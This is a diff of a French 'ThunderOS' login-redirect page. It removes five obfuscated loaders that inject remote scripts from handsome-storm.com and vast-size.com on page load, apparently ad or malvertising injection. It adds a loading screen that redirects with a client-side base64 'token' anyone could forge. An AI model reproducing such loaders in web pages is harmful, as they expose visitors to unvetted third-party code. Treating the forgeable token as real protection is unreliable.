@@ -1,83 +1,161 @@
+
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta name="e3a032bfaabc67025fcdf780f17fa7364fddcf4d" content="e3a032bfaabc67025fcdf780f17fa7364fddcf4d" />
-  <meta name="referrer" content="no-referrer-when-downgrade" />
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#090b12">
+  <title>ThunderOS — Connexion</title>
 
-  
-  <script>
-(function(hcpi){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = hcpi || {};
-s.src = "\/\/handsome-storm.com\/bKX\/V\/sMd.G\/ld0\/Y\/W\/c-\/SeemH9juQZIUClckXP\/T\/YR2gMrzsE\/4fNiTxM-tiNHjkYszoM\/T\/g\/1MNYAv";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
-  <script>
-(function(ulwq){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = ulwq || {};
-s.src = "\/\/handsome-storm.com\/beX.V\/sUdUG\/la0kYwWfc_\/QeKmn9Lu\/ZyUolvkOPxTsYp2dMYzhEY3sOPT\/E\/t\/NIjRYPzWMfTzcZ5IMQgp";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
-  <script>
-(function(lzjxhaj){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = lzjxhaj || {};
-s.src = "\/\/handsome-storm.com\/b\/X.Vrsmd_G\/lA0yYMWBci\/eeUmd9muIZOUvlxk\/PwTPY\/2qMTziE\/4XNSTScRttNIj\/YPzrMkTDgv1HOxAY";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
-  <script>
-(function(xtoj){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = xtoj || {};
-s.src = "\/\/handsome-storm.com\/bjX.VvsddgGxlW0_YHWBcn\/Ge\/md9Eu\/ZaUflxk_PrT\/Yw2lMVzQE\/4DNgjRAMtvNDjQYRzvMHTJgy2ZMnQM";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
-  <script>
-(function(sxci){
-var d = document,
-    s = d.createElement('script'),
-    l = d.scripts[d.scripts.length - 1];
-s.settings = sxci || {};
-s.src = "\/\/vast-size.com\/cMD\/9.6Vb\/2u5AlbSwWbQd9EN\/jFYjz-M\/TugG2VNUiS0_2gNxjgMRxGO\/D\/Yw3D";
-s.async = true;
-s.referrerPolicy = 'no-referrer-when-downgrade';
-l.parentNode.insertBefore(s, l);
-})({})
-</script>
+  <style>
+    * { box-sizing: border-box; }
 
-
-  <script>
-    // Génère et redirige automatiquement
-    window.onload = function() {
-      const exp = Date.now() + 60*1000;
-      const token = btoa(`${exp}-${Math.floor(Math.random()*1e7)}`);
-      // Redirige vers la racine avec paramètres (ou adapte le chemin si besoin)
-      window.location.replace(`https://t0s.pages.dev/?tok=${token}&exp=${exp}`);
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      background: #090b12;
+      color: #f7f8ff;
+      font-family: Inter, -apple-system, BlinkMacSystemFont,
+                   "Segoe UI", sans-serif;
+      overflow: hidden;
     }
-  </script>
+
+    .glow {
+      position: fixed;
+      width: 450px;
+      height: 450px;
+      border-radius: 50%;
+      background: #4059ff;
+      filter: blur(160px);
+      opacity: .17;
+      top: -250px;
+      left: 50%;
+      transform: translateX(-50%);
+      pointer-events: none;
+    }
+
+    .container {
+      position: relative;
+      width: min(90%, 380px);
+      text-align: center;
+      animation: appear .7s ease both;
+    }
+
+    .logo {
+      width: 76px;
+      height: 76px;
+      margin: 0 auto 24px;
+      display: grid;
+      place-items: center;
+      border-radius: 22px;
+      background: linear-gradient(145deg, #7185ff, #2739a9);
+      box-shadow: 0 15px 45px #4a60ff35;
+      font-size: 39px;
+      font-weight: 800;
+      letter-spacing: -3px;
+    }
+
+    h1 {
+      margin: 0;
+      font-size: 30px;
+      letter-spacing: -1.2px;
+      font-weight: 750;
+    }
+
+    .subtitle {
+      margin: 12px 0 0;
+      font-size: 14px;
+      color: #9299ad;
+    }
+
+    .progress {
+      width: 100%;
+      max-width: 270px;
+      height: 5px;
+      margin: 36px auto 15px;
+      border-radius: 20px;
+      background: #252a3a;
+      overflow: hidden;
+    }
+
+    .progress-bar {
+      height: 100%;
+      width: 0;
+      border-radius: inherit;
+      background: linear-gradient(90deg, #526aff, #a3b1ff);
+      animation: loading 2.5s ease-in-out forwards;
+    }
+
+    .status {
+      font-size: 12px;
+      color: #7f879d;
+    }
+
+    footer {
+      position: fixed;
+      bottom: 26px;
+      color: #555d71;
+      font-size: 11px;
+    }
+
+    @keyframes appear {
+      from { opacity: 0; transform: translateY(15px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes loading {
+      0% { width: 0; }
+      35% { width: 45%; }
+      75% { width: 80%; }
+      100% { width: 100%; }
+    }
+
+    @media (prefers-reduced-motion: reduce) {
+      .container { animation: none; }
+      .progress-bar { animation: none; width: 100%; }
+    }
+  </style>
 </head>
+
 <body>
+  <div class="glow"></div>
+
+  <main class="container">
+    <div class="logo">T</div>
+    <h1>ThunderOS</h1>
+    <p class="subtitle">Préparation de votre espace...</p>
+
+    <div class="progress" role="progressbar"
+         aria-label="Chargement">
+      <div class="progress-bar"></div>
+    </div>
+
+    <div class="status" id="status">
+      Connexion en cours...
+    </div>
+  </main>
+
+  <footer>© ThunderOS</footer>
+
+  <script>
+    window.addEventListener("load", () => {
+      const exp = Date.now() + 60 * 1000;
+      const token = btoa(
+        `${exp}-${Math.floor(Math.random() * 1e7)}`
+      );
+
+      setTimeout(() => {
+        document.getElementById("status").textContent =
+          "Redirection vers ThunderOS...";
+
+        window.location.replace(
+          `https://t0s.pages.dev/?tok=${encodeURIComponent(token)}&exp=${exp}`
+        );
+      }, 2500);
+    });
+  </script>
 </body>
 </html>
